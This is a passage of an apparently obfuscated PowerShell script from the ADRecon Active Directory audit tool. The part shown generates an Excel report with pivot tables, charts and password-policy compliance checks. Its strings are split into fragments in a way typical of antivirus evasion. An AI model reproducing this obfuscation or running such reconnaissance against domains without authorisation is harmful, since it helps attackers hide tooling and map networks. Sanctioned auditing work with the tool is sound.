            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = ('Tabl'+'eSty'+'leLi'+'ght2') # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $worksheet.UsedRange.EntireColumn.AutoFit() | Out-Null
        }
        Remove-Variable ADFileName
    }
    Elseif ($Method -eq 2)
    {
        $worksheet = $workbook.Worksheets.Item(1)
        If (Test-Path $ADFileName)
        {
            $ADTemp = Import-Csv -Path $ADFileName
            $ADTemp | ForEach-Object {
                Foreach ($prop in $_.PSObject.Properties)
                {
                    $worksheet.Cells.Item($row, $column) = $prop.Name
                    $worksheet.Cells.Item($row, $column + 1) = $prop.Value
                    $row++
                }
            }
            Remove-Variable ADTemp
            $listObject = $worksheet.ListObjects.Add([Microsoft.Office.Interop.Excel.XlListObjectSourceType]::xlSrcRange, $worksheet.UsedRange, $null, [Microsoft.Office.Interop.Excel.XlYesNoGuess]::xlYes, $null)
            $listObject.TableStyle = ('Ta'+'bleStyl'+'e'+'Light2') # Style Cheat Sheet: https://msdn.microsoft.com/en-au/library/documentformat.openxml.spreadsheet.tablestyle.aspx
            $usedRange = $worksheet.UsedRange
            $usedRange.EntireColumn.AutoFit() | Out-Null
        }
        Else
        {
            $worksheet.Cells.Item($row, $column) = ('Error'+'!')
        }
        Remove-Variable ADFileName
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

# Thanks Anant Shrivastava for the suggestion of using Pivot Tables for generation of the Stats sheets.
Function Get-ADRExcelPivotTable
{
<#
.SYNOPSIS
    Helper to add Pivot Table to the current WorkSheet.

.DESCRIPTION
    Helper to add Pivot Table to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER PivotTableName
    [string]
    Pivot Table Name.

.PARAMETER PivotRows
    [array]
    Row names from Source Sheet.

.PARAMETER PivotColumns
    [array]
    Column names from Source Sheet.

.PARAMETER PivotFilters
    [array]
    Row/Column names from Source Sheet to use as filters.

.PARAMETER PivotValues
    [array]
    Row/Column names from Source Sheet to use for Values.

.PARAMETER PivotPercentage
    [array]
    Row/Column names from Source Sheet to use for Percentage.

.PARAMETER PivotLocation
    [array]
    Location of the Pivot Table in Row/Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $false)]
        [array] $PivotRows,

        [Parameter(Mandatory = $false)]
        [array] $PivotColumns,

        [Parameter(Mandatory = $false)]
        [array] $PivotFilters,

        [Parameter(Mandatory = $false)]
        [array] $PivotValues,

        [Parameter(Mandatory = $false)]
        [array] $PivotPercentage,

        [Parameter(Mandatory = $false)]
        [string] $PivotLocation = ('R1'+'C1')
    )

    $excel.ScreenUpdating = $false
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)
    $workbook.ShowPivotTableFieldList = $false

    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottablesourcetype-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivottableversionlist-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfieldorientation-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/constants-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlsortorder-enumeration-excel
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlpivotfiltertype-enumeration-excel

    # xlDatabase = 1 # this just means local sheet data
    # xlPivotTableVersion12 = 3 # Excel 2007
    $PivotFailed = $false
    Try
    {
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $SrcWorksheet.UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
    }
    Catch
    {
        $PivotFailed = $true
        Write-Verbose ('[Pi'+'votCaches('+').Cre'+'ate] Fai'+'l'+'ed')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
    }
    If ( $PivotFailed -eq $true )
    {
        $rows = $SrcWorksheet.UsedRange.Rows.Count
        If ($SrcSheetName -eq ('Co'+'mputer SP'+'Ns'))
        {
            $PivotCols = ('A'+'1:C')
        }
        ElseIf ($SrcSheetName -eq ('C'+'ompu'+'ters'))
        {
            $PivotCols = ('A1'+':F')
        }
        ElseIf ($SrcSheetName -eq ('Use'+'rs'))
        {
            $PivotCols = ('A1'+':C')
        }
        $UsedRange = $SrcWorksheet.Range($PivotCols+$rows)
        $PivotCaches = $workbook.PivotCaches().Create([Microsoft.Office.Interop.Excel.XlPivotTableSourceType]::xlDatabase, $UsedRange, [Microsoft.Office.Interop.Excel.XlPivotTableVersionList]::xlPivotTableVersion12)
        Remove-Variable rows
	    Remove-Variable PivotCols
        Remove-Variable UsedRange
    }
    Remove-Variable PivotFailed
    $PivotTable = $PivotCaches.CreatePivotTable($PivotLocation,$PivotTableName)
    # $workbook.ShowPivotTableFieldList = $true

    If ($PivotRows)
    {
        ForEach ($Row in $PivotRows)
        {
            $PivotField = $PivotTable.PivotFields($Row)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlRowField
        }
    }

    If ($PivotColumns)
    {
        ForEach ($Col in $PivotColumns)
        {
            $PivotField = $PivotTable.PivotFields($Col)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlColumnField
        }
    }

    If ($PivotFilters)
    {
        ForEach ($Fil in $PivotFilters)
        {
            $PivotField = $PivotTable.PivotFields($Fil)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlPageField
        }
    }

    If ($PivotValues)
    {
        ForEach ($Val in $PivotValues)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
        }
    }

    If ($PivotPercentage)
    {
        ForEach ($Val in $PivotPercentage)
        {
            $PivotField = $PivotTable.PivotFields($Val)
            $PivotField.Orientation = [Microsoft.Office.Interop.Excel.XlPivotFieldOrientation]::xlDataField
            $PivotField.Calculation = [Microsoft.Office.Interop.Excel.XlPivotFieldCalculation]::xlPercentOfTotal
            $PivotTable.ShowValuesRow = $false
        }
    }

    # $PivotFields.Caption = ""
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotField
    Remove-Variable PivotField
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotTable
    Remove-Variable PivotTable
    Get-ADRExcelComObjRelease -ComObjtoRelease $PivotCaches
    Remove-Variable PivotCaches
    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
}

Function Get-ADRExcelAttributeStats
{
<#
.SYNOPSIS
    Helper to add Attribute Stats to the current WorkSheet.

.DESCRIPTION
    Helper to add Attribute Stats to the current WorkSheet.

.PARAMETER SrcSheetName
    [string]
    Source Sheet Name.

.PARAMETER Title1
    [string]
    Title1.

.PARAMETER PivotTableName
    [string]
    PivotTableName.

.PARAMETER PivotRows
    [string]
    PivotRows.

.PARAMETER PivotValues
    [string]
    PivotValues.

.PARAMETER PivotPercentage
    [string]
    PivotPercentage.

.PARAMETER Title2
    [string]
    Title2.

.PARAMETER ObjAttributes
    [OrderedDictionary]
    Attributes.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $SrcSheetName,

        [Parameter(Mandatory = $true)]
        [string] $Title1,

        [Parameter(Mandatory = $true)]
        [string] $PivotTableName,

        [Parameter(Mandatory = $true)]
        [string] $PivotRows,

        [Parameter(Mandatory = $true)]
        [string] $PivotValues,

        [Parameter(Mandatory = $true)]
        [string] $PivotPercentage,

        [Parameter(Mandatory = $true)]
        [string] $Title2,

        [Parameter(Mandatory = $true)]
        [System.Object] $ObjAttributes
    )

    $excel.ScreenUpdating = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $SrcWorksheet = $workbook.Sheets.Item($SrcSheetName)

    $row = 1
    $column = 1
    $worksheet.Cells.Item($row, $column) = $Title1
    $worksheet.Cells.Item($row,$column).Style = ('Head'+'ing 2')
    $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
    $MergeCells = $worksheet.Range(('A1:C'+'1'))
    $MergeCells.Select() | Out-Null
    $MergeCells.MergeCells = $true
    Remove-Variable MergeCells

    Get-ADRExcelPivotTable -SrcSheetName $SrcSheetName -PivotTableName $PivotTableName -PivotRows @($PivotRows) -PivotValues @($PivotValues) -PivotPercentage @($PivotPercentage) -PivotLocation ('R2'+'C1')
    $excel.ScreenUpdating = $false

    $row = 2
    ('T'+'ype'),('Coun'+'t'),('P'+'erce'+'nt'+'age') | ForEach-Object {
        $worksheet.Cells.Item($row, $column) = $_
        $worksheet.Cells.Item($row, $column).Font.Bold = $True
        $column++
    }

    $row = 3
    $column = 1
    For($row = 3; $row -le 6; $row++)
    {
        $temptext = [string] $worksheet.Cells.Item($row, $column).Text
        switch ($temptext.ToUpper())
        {
            ('T'+'RUE') { $worksheet.Cells.Item($row, $column) = ('Ena'+'ble'+'d') }
            ('FALS'+'E') { $worksheet.Cells.Item($row, $column) = ('Disable'+'d') }
            ('G'+'R'+'AND TOTAL') { $worksheet.Cells.Item($row, $column) = ('To'+'tal') }
        }
    }

    If ($ObjAttributes)
    {
        $row = 1
        $column = 6
        $worksheet.Cells.Item($row, $column) = $Title2
        $worksheet.Cells.Item($row,$column).Style = ('Head'+'i'+'ng 2')
        $worksheet.Cells.Item($row,$column).HorizontalAlignment = -4108
        $MergeCells = $worksheet.Range(('F1:'+'L1'))
        $MergeCells.Select() | Out-Null
        $MergeCells.MergeCells = $true
        Remove-Variable MergeCells

        $row++
        ('C'+'atego'+'ry'),('Ena'+'bled Co'+'unt'),('Enabl'+'ed Perce'+'ntag'+'e'),('Disabl'+'ed'+' Cou'+'n'+'t'),('Di'+'sabled'+' Percentag'+'e'),('Tota'+'l'+' Co'+'unt'),('Total P'+'erc'+'e'+'nt'+'age') | ForEach-Object {
            $worksheet.Cells.Item($row, $column) = $_
            $worksheet.Cells.Item($row, $column).Font.Bold = $True
            $column++
        }
        $ExcelColumn = ($SrcWorksheet.Columns.Find(('En'+'a'+'bled')))
        $EnabledColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
        $column = 6
        $i = 2

        $ObjAttributes.keys | ForEach-Object {
            $ExcelColumn = ($SrcWorksheet.Columns.Find($_))
            $ColAddress = "$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1)):$($ExcelColumn.Address($false,$false).Substring(0,$ExcelColumn.Address($false,$false).Length-1))"
            $row++
            $i++
            If ($_ -eq ('De'+'legati'+'on T'+'yp'))
            {
                $worksheet.Cells.Item($row, $column) = ('U'+'nc'+'ons'+'trained'+' Delegat'+'i'+'on')
            }
            ElseIf ($_ -eq ('De'+'legation '+'T'+'y'+'pe'))
            {
                $worksheet.Cells.Item($row, $column) = ('Const'+'raine'+'d '+'Delegation')
            }
            Else
            {
                $worksheet.Cells.Item($row, $column).Formula = (('='+'Vv'+'H').RePLaCe(([CHAr]86+[CHAr]118+[CHAr]72),[sTRINg][CHAr]39)) + $SrcWorksheet.Name + (('{'+'0}!')-f [CHAr]39) + $ExcelColumn.Address($false,$false)
            }
            $worksheet.Cells.Item($row, $column+1).Formula = ((('=CO'+'U'+'NTIFS({0}') -f[CHaR]39)) + $SrcWorksheet.Name + (('b8'+'f!').RepLACe('b8f',[strINg][chAR]39)) + $EnabledColAddress + ((',3'+'g'+'0TR'+'UE'+'3g0,') -replAcE([chaR]51+[chaR]103+[chaR]48),[chaR]34) + "'" + $SrcWorksheet.Name + (('vF'+'f!').REplACE('vFf',[sTrinG][CHar]39)) + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet.Cells.Item($row, $column+2).Formula = (('='+'IF'+'ERROR'+'(G')) + $i + ((('/VLOO'+'K'+'U'+'P(IWcE'+'nable'+'dIWc,A3:B6'+',2,'+'F'+'ALSE'+'),'+'0)') -cRePlace'IWc',[char]34))
            $worksheet.Cells.Item($row, $column+3).Formula = ((('='+'C'+'OUNTIF'+'S(Ogl')  -crePLaCe'Ogl',[chaR]39)) + $SrcWorksheet.Name + (('OQ'+'0!').repLAce(([chAR]79+[chAR]81+[chAR]48),[sTRiNG][chAR]39)) + $EnabledColAddress + ((',{'+'0}FA'+'LSE'+'{0'+'},') -F [Char]34) + "'" + $SrcWorksheet.Name + (('k8x'+'!').rEPlaCe('k8x',[sTriNG][ChaR]39)) + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            $worksheet.Cells.Item($row, $column+4).Formula = (('=I'+'FERROR('+'I')) + $i + ((('/V'+'LOOKUP({0}Dis'+'abl'+'ed'+'{0},A3'+':'+'B'+'6'+',2,FAL'+'SE'+'),'+'0)')  -f [cHAr]34))
            If ( ($_ -eq ('SID'+'His'+'tory')) -or ($_ -eq ('ms-d'+'s-Crea'+'t'+'orSid')) )
            {
                # Remove count of FieldName
                $worksheet.Cells.Item($row, $column+5).Formula = ((('=COUN'+'T'+'IF(5Ev') -cREplACE  ([chAR]53+[chAR]69+[chAR]118),[chAR]39)) + $SrcWorksheet.Name + (('{'+'0}!')  -F  [cHaR]39) + $ColAddress + ',' + $ObjAttributes[$_] + ((')-'+'1'))
            }
            Else
            {
                $worksheet.Cells.Item($row, $column+5).Formula = ((('=C'+'O'+'UNT'+'IF(BF5')  -rEPLaCe'BF5',[CHAR]39)) + $SrcWorksheet.Name + (('4yo'+'!')  -rEpLACE  '4yo',[Char]39) + $ColAddress + ',' + $ObjAttributes[$_] + ')'
            }
            $worksheet.Cells.Item($row, $column+6).Formula = (('='+'I'+'FE'+'RROR(K')) + $i + (('/VL'+'O'+'O'+'KUP(IMk'+'T'+'o'+'ta'+'lIMk,A'+'3:B6,'+'2,FALSE'+'),0)').replaCe('IMk',[stRiNG][cHAr]34))
        }

        # http://www.excelhowto.com/macros/formatting-a-range-of-cells-in-excel-vba/
        "H", "J" , "L" | ForEach-Object {
            $rng = $_ + $($row - $ObjAttributes.Count + 1) + ":" + $_ + $($row)
            $worksheet.Range($rng).NumberFormat = ('0.0'+'0%')
        }
    }
    $excel.ScreenUpdating = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $SrcWorksheet
    Remove-Variable SrcWorksheet
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelChart
{
<#
.SYNOPSIS
    Helper to add charts to the current WorkSheet.

.DESCRIPTION
    Helper to add charts to the current WorkSheet.

.PARAMETER ChartType
    [int]
    Chart Type.

.PARAMETER ChartLayout
    [int]
    Chart Layout.

.PARAMETER ChartTitle
    [string]
    Title of the Chart.

.PARAMETER RangetoCover
    WorkSheet Range to be covered by the Chart.

.PARAMETER ChartData
    Data for the Chart.

.PARAMETER StartRow
    Start row to calculate data for the Chart.

.PARAMETER StartColumn
    Start column to calculate data for the Chart.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ChartType,

        [Parameter(Mandatory = $true)]
        [int] $ChartLayout,

        [Parameter(Mandatory = $true)]
        [string] $ChartTitle,

        [Parameter(Mandatory = $true)]
        $RangetoCover,

        [Parameter(Mandatory = $false)]
        $ChartData = $null,

        [Parameter(Mandatory = $false)]
        $StartRow = $null,

        [Parameter(Mandatory = $false)]
        $StartColumn = $null
    )

    $excel.ScreenUpdating = $false
    $excel.DisplayAlerts = $false
    $worksheet = $workbook.Worksheets.Item(1)
    $chart = $worksheet.Shapes.AddChart().Chart
    # https://msdn.microsoft.com/en-us/vba/excel-vba/articles/xlcharttype-enumeration-excel
    $chart.chartType = [int]([Microsoft.Office.Interop.Excel.XLChartType]::$ChartType)
    $chart.ApplyLayout($ChartLayout)
    If ($null -eq $ChartData)
    {
        If ($null -eq $StartRow)
        {
            $start = $worksheet.Range('A1')
        }
        Else
        {
            $start = $worksheet.Range($StartRow)
        }
        # get the last cell
        $X = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        If ($null -eq $StartColumn)
        {
            $start = $worksheet.Range('B1')
        }
        Else
        {
            $start = $worksheet.Range($StartColumn)
        }
        # get the last cell
        $Y = $worksheet.Range($start,$start.End([Microsoft.Office.Interop.Excel.XLDirection]::xlDown))
        $ChartData = $worksheet.Range($X,$Y)

        Get-ADRExcelComObjRelease -ComObjtoRelease $X
        Remove-Variable X
        Get-ADRExcelComObjRelease -ComObjtoRelease $Y
        Remove-Variable Y
        Get-ADRExcelComObjRelease -ComObjtoRelease $start
        Remove-Variable start
    }
    $chart.SetSourceData($ChartData)
    # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.chartclass.plotby?redirectedfrom=MSDN&view=excel-pia#Microsoft_Office_Interop_Excel_ChartClass_PlotBy
    $chart.PlotBy = [Microsoft.Office.Interop.Excel.XlRowCol]::xlColumns
    $chart.seriesCollection(1).Select() | Out-Null
    $chart.SeriesCollection(1).ApplyDataLabels() | out-Null
    # modify the chart title
    $chart.HasTitle = $True
    $chart.ChartTitle.Text = $ChartTitle
    # Reposition the Chart
    $temp = $worksheet.Range($RangetoCover)
    # $chart.parent.placement = 3
    $chart.parent.top = $temp.Top
    $chart.parent.left = $temp.Left
    $chart.parent.width = $temp.Width
    If ($ChartTitle -ne ('P'+'rivilege'+'d Gro'+'ups '+'i'+'n'+' '+'AD'))
    {
        $chart.parent.height = $temp.Height
    }
    # $chart.Legend.Delete()
    $excel.ScreenUpdating = $true
    $excel.DisplayAlerts = $true

    Get-ADRExcelComObjRelease -ComObjtoRelease $chart
    Remove-Variable chart
    Get-ADRExcelComObjRelease -ComObjtoRelease $ChartData
    Remove-Variable ChartData
    Get-ADRExcelComObjRelease -ComObjtoRelease $temp
    Remove-Variable temp
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Get-ADRExcelSort
{
<#
.SYNOPSIS
    Sorts a WorkSheet in the active Workbook.

.DESCRIPTION
    Sorts a WorkSheet in the active Workbook.

.PARAMETER ColumnName
    [string]
    Name of the Column.
#>
    param (
        [Parameter(Mandatory = $true)]
        [string] $ColumnName
    )

    $worksheet = $workbook.Worksheets.Item(1)
    $worksheet.Activate();

    $ExcelColumn = ($worksheet.Columns.Find($ColumnName))
    If ($ExcelColumn)
    {
        If ($ExcelColumn.Text -ne $ColumnName)
        {
            $BeginAddress = $ExcelColumn.Address(0,0,1,1)
            $End = $False
            Do {
                #Write-Verbose "[Get-ADRExcelSort] $($ExcelColumn.Text) selected instead of $($ColumnName) in the $($worksheet.Name) worksheet."
                $ExcelColumn = ($worksheet.Columns.FindNext($ExcelColumn))
                $Address = $ExcelColumn.Address(0,0,1,1)
                If ( ($Address -eq $BeginAddress) -or ($ExcelColumn.Text -eq $ColumnName) )
                {
                    $End = $True
                }
            } Until ($End -eq $True)
        }
        If ($ExcelColumn.Text -eq $ColumnName)
        {
            # Sort by Column
            $workSheet.ListObjects.Item(1).Sort.SortFields.Clear()
            $workSheet.ListObjects.Item(1).Sort.SortFields.Add($ExcelColumn) | Out-Null
            $worksheet.ListObjects.Item(1).Sort.Apply()
        }
        Else
        {
            Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
        }
    }
    Else
    {
        Write-Verbose "[Get-ADRExcelSort] $($ColumnName) not found in the $($worksheet.Name) worksheet. "
    }
    Get-ADRExcelComObjRelease -ComObjtoRelease $worksheet
    Remove-Variable worksheet
}

Function Export-ADRExcel
{
<#
.SYNOPSIS
    Automates the generation of the ADRecon report.

.DESCRIPTION
    Automates the generation of the ADRecon report. If specific files exist, they are imported into the ADRecon report.

.PARAMETER ExcelPath
    [string]
    Path for ADRecon output folder containing the CSV files to generate the ADRecon-Report.xlsx

.OUTPUTS
    Creates the ADRecon-Report.xlsx report in the folder.
#>
    param(
        [Parameter(Mandatory = $true)]
        [string] $ExcelPath
    )

    $ExcelPath = $((Convert-Path $ExcelPath).TrimEnd("\"))
    $ReportPath = -join($ExcelPath,'\',('CS'+'V-F'+'iles'))
    If (!(Test-Path $ReportPath))
    {
        Write-Warning ('[Ex'+'p'+'o'+'r'+'t-ADR'+'Ex'+'cel] Could not locate the CSV'+'-F'+'iles d'+'irec'+'t'+'ory .'+'.. '+'Exiting')
        Write-Verbose "[EXCEPTION] $($_.Exception.Message) "
        Return $null
    }
    Get-ADRExcelComObj
    If ($excel)
    {
        Write-Output ('['+'*] Gener'+'ating'+' ADR'+'eco'+'n-'+'Rep'+'or'+'t'+'.xl'+'sx')

        $ADFileName = -join($ReportPath,'\',('Abo'+'ut'+'A'+'DR'+'econ.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $workbook.Worksheets.Item(1).Name = ('Abo'+'ut '+'ADRe'+'con')
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(3,2) , ('ht'+'tps:'+'//gith'+'ub.com/adre'+'c'+'on/AD'+'Recon'), "" , "", ('gi'+'thub.com/'+'adrecon'+'/ADRec'+'on')) | Out-Null
            $workbook.Worksheets.Item(1).UsedRange.EntireColumn.AutoFit() | Out-Null
        }

        $ADFileName = -join($ReportPath,'\',('Fore'+'st.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('F'+'ores'+'t')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Dom'+'ain.c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Dom'+'ain')
            Get-ADRExcelImport -ADFileName $ADFileName
            $DomainObj = Import-CSV -Path $ADFileName
            Remove-Variable ADFileName
            $DomainName = -join($DomainObj[0].Value,"-")
            Remove-Variable DomainObj
        }

        $ADFileName = -join($ReportPath,'\',('T'+'rusts.c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Trus'+'ts')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Su'+'bnets.'+'c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Sub'+'nets')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Sites'+'.cs'+'v'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Sit'+'es')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Schema'+'His'+'to'+'r'+'y.csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Schema'+'H'+'isto'+'ry')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('Fin'+'eG'+'rain'+'edPasswo'+'rdPolicy.'+'csv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Fine '+'Gr'+'aine'+'d P'+'as'+'swo'+'rd'+' Policy')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName
        }

        $ADFileName = -join($ReportPath,'\',('D'+'ef'+'au'+'ltPasswo'+'rdPolicy.'+'c'+'sv'))
        If (Test-Path $ADFileName)
        {
            Get-ADRExcelWorkbook -Name ('Defau'+'lt Pa'+'ss'+'w'+'ord Policy')
            Get-ADRExcelImport -ADFileName $ADFileName
            Remove-Variable ADFileName

            $excel.ScreenUpdating = $false
            $worksheet = $workbook.Worksheets.Item(1)
            # https://docs.microsoft.com/en-us/office/vba/api/excel.xlhalign
            $worksheet.Range(('B2:G1'+'0')).HorizontalAlignment = -4108
            # https://docs.microsoft.com/en-us/office/vba/api/excel.range.borderaround

            ('A2'+':B10'), ('C2:D'+'10'), ('E'+'2:'+'F10'), ('G'+'2:G10') | ForEach-Object {
                $worksheet.Range($_).BorderAround(1) | Out-Null
            }

            # https://docs.microsoft.com/en-us/dotnet/api/microsoft.office.interop.excel.formatconditions.add?view=excel-pia
            # $worksheet.Range().FormatConditions.Add
            # http://dmcritchie.mvps.org/excel/colors.htm
            # Values for Font.ColorIndex

            $ObjValues = @(
            # PCI Enforce password history (passwords)
            'C2', ('=IF(B2'+'<4'+',T'+'RU'+'E, FALSE)')

            # PCI Maximum password age (days)
            'C3', ('=IF(OR(B3'+'=0'+','+'B'+'3>90)'+',TRU'+'E,'+' FALS'+'E)')

            # PCI Minimum password age (days)

            # PCI Minimum password length (characters)
            'C5', ('=IF('+'B5<7,TRUE, FA'+'LS'+'E'+')')

            # PCI Password must meet complexity requirements
            'C6', ('=I'+'F'+'(B6<>TRUE'+',TRUE, '+'F'+'A'+'LSE'+')')

            # PCI Store password using reversible encryption for all users in the domain

            # PCI Account lockout duration (mins)
            'C8', ('=IF(A'+'ND(B'+'8>=1'+',B8<30),TR'+'U'+'E, F'+'ALSE'+')')

            # PCI Account lockout threshold (attempts)
            'C9', ('=IF('+'OR(B9=0,'+'B9>6),T'+'R'+'UE, FAL'+'SE)')

            # PCI Reset account lockout counter after (mins)

            # ASD ISM Enforce password history (passwords)
            'E2', ('=IF'+'(B2'+'<8,T'+'RUE, '+'FAL'+'SE)')

            # ASD ISM Maximum password age (days)
            'E3', ('=IF(OR('+'B'+'3=0'+',B3>90),TRUE, FA'+'LS'+'E)')

            # ASD ISM Minimum password age (days)
            'E4', ('=IF(B'+'4'+'=0,TR'+'UE'+', FALSE)')

            # ASD ISM Minimum password length (characters)
            'E5', ('=IF'+'(B5'+'<13,'+'T'+'RUE'+', FAL'+'SE)')

            # ASD ISM Password must meet complexity requirements
            'E6', ('='+'IF('+'B6<'+'>TRUE,TRUE, '+'FALSE)')

            # ASD ISM Store password using reversible encryption for all users in the domain

            # ASD ISM Account lockout duration (mins)

            # ASD ISM Account lockout threshold (attempts)
            'E9', ('='+'IF(O'+'R'+'(B9=0,'+'B9>'+'5),T'+'RUE, '+'FALSE)')

            # ASD ISM Reset account lockout counter after (mins)

            # CIS Benchmark Enforce password history (passwords)
            'G2', ('=IF('+'B2'+'<24,TRUE, '+'F'+'ALS'+'E)')

            # CIS Benchmark Maximum password age (days)
            'G3', ('='+'IF(OR'+'(B3='+'0,B3'+'>60)'+',TRU'+'E,'+' FA'+'LSE'+')')

            # CIS Benchmark Minimum password age (days)
            'G4', ('=IF('+'B'+'4=0'+',TR'+'U'+'E, FALSE)')

            # CIS Benchmark Minimum password length (characters)
            'G5', ('=IF'+'(B5<1'+'4,'+'T'+'RU'+'E, F'+'ALSE)')

            # CIS Benchmark Password must meet complexity requirements
            'G6', ('=IF'+'(B6<'+'>TRUE,TRUE, F'+'A'+'LS'+'E)')

            # CIS Benchmark Store password using reversible encryption for all users in the domain
            'G7', ('=IF'+'('+'B7'+'<>FALSE,'+'TR'+'UE, FAL'+'SE)')

            # CIS Benchmark Account lockout duration (mins)
            'G8', ('=IF'+'('+'A'+'ND(B8>=1,B8<15'+'),'+'TRUE, F'+'AL'+'S'+'E)')

            # CIS Benchmark Account lockout threshold (attempts)
            'G9', ('='+'I'+'F'+'(OR(B9'+'=0'+',B9'+'>10),TRUE, FALS'+'E)')

            # CIS Benchmark Reset account lockout counter after (mins)
            ('G1'+'0'), ('=IF'+'(B10<15,'+'TRUE, '+'FA'+'LSE)') )

            For ($i = 0; $i -lt $($ObjValues.Count); $i++)
            {
                $worksheet.Range($ObjValues[$i]).FormatConditions.Add([Microsoft.Office.Interop.Excel.XlFormatConditionType]::xlExpression, 0, $ObjValues[$i+1]) | Out-Null
                $i++
            }

            'C2', 'C3' , 'C5', 'C6', 'C8', 'C9', 'E2', 'E3' , 'E4', 'E5', 'E6', 'E9', 'G2', 'G3', 'G4', 'G5', 'G6', 'G7', 'G8', 'G9', ('G'+'10') | ForEach-Object {
                $worksheet.Range($_).FormatConditions.Item(1).StopIfTrue = $false
                $worksheet.Range($_).FormatConditions.Item(1).Font.ColorIndex = 3
            }

            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,4) , ('https://www'+'.pc'+'isecurit'+'y'+'st'+'andards'+'.org/docum'+'ent'+'_li'+'brary?ca'+'tegory=pcidss&'+'docu'+'me'+'nt'+'=p'+'ci_dss'), "" , "", ('P'+'C'+'I DSS v3.2.1')) | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,6) , ('https://ac'+'sc.gov.a'+'u/info'+'s'+'e'+'c/ism'+'/'), "" , "", ('2'+'018 ISM '+'C'+'ontrols')) | Out-Null
            $workbook.Worksheets.Item(1).Hyperlinks.Add($workbook.Worksheets.Item(1).Cells.Item(1,7) , ('h'+'ttp'+'s://www.cis'+'ec'+'ur'+'i'+'ty.o'+'r'+'g/benchmark/m'+'i'+'c'+'ros'+'oft'+'_'+'wind'+'ows_serv'+'er'+'/'), "" , "", ('C'+'IS'+' Benchmark '+'2016')) | Out-Null

            $excel.ScreenUpdating = $true
